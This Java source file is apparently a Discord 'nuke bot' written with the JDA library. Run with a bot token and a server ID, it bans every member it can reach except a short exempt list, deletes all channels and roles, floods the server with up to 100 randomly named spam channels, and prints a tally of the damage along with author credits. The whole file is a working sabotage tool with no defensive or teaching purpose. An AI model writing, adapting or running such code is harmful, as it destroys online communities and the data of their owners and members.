package org.hcrival.nukebot;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.channel.middleman.GuildChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.List;
import java.util.concurrent.TimeUnit;

public class NukeBot {

    private final List<String> exemptList = List.of(
            "345342568025817098" // example
    );

    private final String spamChannelName = "nuked";
    private final boolean spamChannels = true;
    private final boolean randomChannelNames = true;
    private final int spamChannelAmount = 100; // wouldn't do more then 500 due to probably being rate limited

    private final String spamRoleName = "nuked";
    private final boolean randomRoleNames = false;
    private final boolean spamRoles = false;
    private final int spamRoleAmount = 500; // cannot do more then 250 due to discord api limits

    public NukeBot(String token, long guildId) throws InterruptedException {
        JDA jda = JDABuilder.create(
                        token,
                        GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS))
                .setMemberCachePolicy(MemberCachePolicy.ALL)
                .setChunkingFilter(ChunkingFilter.ALL)
                .build().awaitReady();

        System.out.println(" ");
        System.out.println("Starting the nuking process");
        System.out.println("Starting the nuking process");
        System.out.println("Starting the nuking process");
        System.out.println(" ");

        Guild guild = jda.getGuildById(guildId);

        if (guild == null) {
            System.out.println("Guild not found, make sure the bot is in the discord server!");
            return;
        }

        nuke(guild);
    }

    public static void main(String[] args) throws InterruptedException {
        new NukeBot("", 0L);
    }

    public void nuke(Guild guild) {
        int failedBans = 0;
        int failedChannels = 0;
        int failedRoles = 0;

        int banned = 0;
        Member selfMember = guild.getSelfMember();

        for (Member member : guild.getMembers()) {
            if (member == selfMember) {
                System.out.println("Cannot ban yourself");
                failedBans++;
                continue;
            }

            if (!selfMember.canInteract(member)) {
                System.out.println("Cannot interact with " + member.getEffectiveName());
                failedBans++;
                continue;
            }

            if (exemptList.contains(member.getId())) {
                System.out.println("Exempted " + member.getEffectiveName());
                failedBans++;
                continue;
            }

            member.ban(1, TimeUnit.HOURS).queue();
            banned++;
            System.out.println("Banned " + member.getEffectiveName() + " (" + banned + ")");
        }

        System.out.println(" ");
        System.out.println("Banned " + banned + " members");
        System.out.println("Deleting all channels");

        int channels = 0;
        for (GuildChannel channel : guild.getChannels()) {
            try {
                channel.delete().queue();
                channels++;
            } catch (Exception e) {
                System.out.println("Failed to delete " + channel.getName() + " - " + e.getMessage());
                failedChannels++;
            }
        }

        System.out.println(" ");
        System.out.println("Deleted " + channels + " channels");
        System.out.println("Deleting all roles");

        int amount = 0;
        Role selfRole = selfMember.getRoles().get(0);

        for (Role role : guild.getRoles()) {
            if (!selfRole.canInteract(role)) {
                System.out.println("Cannot interact with " + role.getName());
                failedRoles++;
                continue;
            }

            if (role == guild.getPublicRole() || role == guild.getBoostRole()) {
                System.out.println("Cannot delete the public role or boost role");
                failedRoles++;
                continue;
            }

            try {
                role.delete().queue();
                amount++;
            } catch (Exception e) {
                System.out.println("Failed to delete " + role.getName() + " - " + e.getMessage());
                failedRoles++;
            }
        }

        System.out.println(" ");
        System.out.println("Deleted " + amount + " roles");
        System.out.println("Deleted everything");
        System.out.println(" ");

        if (spamChannels) {
            for (int i = 0; i < spamChannelAmount; i++) {
                guild.createTextChannel((randomChannelNames) ? RandomStringUtils.random(10, true, true) : spamChannelName).queue();
            }
        }

        if (spamRoles) {
            if (spamRoleAmount >= 250) {
                System.out.println("Cannot create more than 250 roles");
                return;
            }

            for (int i = 0; i < spamRoleAmount; i++) {
                guild.createRole().setName((randomRoleNames) ? RandomStringUtils.random(10, true, true) : spamRoleName).queue();
            }
        }

        System.out.println("Guild Statistics: ");
        System.out.println(" Guild Owner: " + guild.getOwner().getEffectiveName());
        System.out.println(" Guild ID: " + guild.getId());
        System.out.println(" Guild Members: " + guild.getMembers().size());
        System.out.println(" ");
        System.out.println(" Banned Members: " + banned);
        System.out.println(" Deleted Channels: " + channels);
        System.out.println(" Deleted Roles: " + amount);
        System.out.println(" ");
        System.out.println(" Failed Bans: " + failedBans);
        System.out.println(" Failed Channels: " + failedChannels);
        System.out.println(" Failed Roles: " + failedRoles);
        System.out.println(" ");
        System.out.println(" Spammed Roles: " + spamRoles);
        System.out.println(" Spammed Channels: " + spamChannels);
        System.out.println(" ");
        System.out.println(" Finished nuking");
        System.out.println(" ");

        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
        System.out.println("Made by Alfie - https://github.com/aplosh - https://github.com/hcrivalorg");
    }
}